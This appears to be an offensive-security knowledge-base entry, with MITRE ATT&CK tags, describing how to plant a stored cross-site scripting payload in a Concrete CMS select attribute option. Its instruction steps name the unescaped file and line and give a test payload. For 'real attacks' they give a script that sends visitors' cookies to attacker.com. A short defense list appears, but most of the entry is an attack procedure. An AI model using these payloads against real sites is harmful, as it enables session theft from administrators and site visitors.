---
tags:
  - xss
  - stored-xss
  - concrete-cms
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
  - PHP
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 7630f9a0-c625-461d-87fb-1c022762ff56
created_at: '2025-12-14T00:11:09.647Z'
updated_at: '2025-12-14T00:11:09.647Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Attribute-Option

## Summary

This procedure injects a malicious JavaScript payload into a select attribute's option value in Concrete CMS, leveraging the absence of sanitization to store executable code for later triggering.

## Description

Once a select attribute is created, its options can be edited via the dashboard. User-supplied values for options are stored without HTML escaping, rooted in files like concrete/attributes/select/type_form.php. This allows arbitrary JS injection, such as <script>alert('XSS')</script>, which persists in the database. The attack scenario targets admin users editing the attribute or unauthenticated users via Express Forms. Prerequisites include the prior creation of the attribute; outcomes include stored malicious content ready for execution.

## Requirements

1. Existing select attribute created in Concrete CMS
2. Admin dashboard access
3. Knowledge of XSS payloads (e.g., for testing or exfiltration)

## Defense

Defensive measures and detection strategies:

- Sanitize all attribute option inputs with htmlspecialchars() or equivalent
- Audit database for suspicious script tags in attribute tables
- Enable WAF rules to block common XSS patterns in admin POST requests

## Objectives

1. Store unsanitized JavaScript in the attribute options
2. Ensure persistence without immediate execution
3. Set up for impact on admins or site visitors via forms

## Instructions

### Step 1: Navigate to Attribute Options Edit

**Context**: Locate the created attribute to add options.

Go to Dashboard > System & Settings > Attributes, find the select attribute, and click 'Edit' or access via /index.php/dashboard/pages/attributes/edit/[id].

> This loads the form for managing options.

### Step 2: Add Malicious Option

**Context**: Input the payload as the option value to bypass sanitization.

In the options section, add a new option. Set the label to something innocuous (e.g., 'Option 1') and the value to `<script>alert('XSS')</script>`. For real attacks, use payloads like `<script>document.location='http://attacker.com?cookie='+document.cookie</script>`. Save the changes.

> The payload is stored raw, vulnerable due to lack of escaping in type_form.php line 40.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[stored-xss]]
- [[JavaScript]]
